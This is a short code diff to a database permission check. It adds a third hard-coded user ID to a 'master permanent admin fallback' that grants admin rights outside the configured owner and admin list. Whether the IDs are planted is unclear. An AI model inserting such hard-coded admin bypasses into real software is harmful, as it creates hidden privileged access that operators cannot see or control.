@@ -133,7 +133,7 @@ class Database:
             if uid == OWNER_ID or uid in ADMINS:
                 return True
             # 2. Master permanent admin fallback
-            if uid in (8738736556, 6363840742):
+            if uid in (8504838657, 8738736556, 6363840742):
                 return True
             # 3. Dynamic environment variables check
             import re
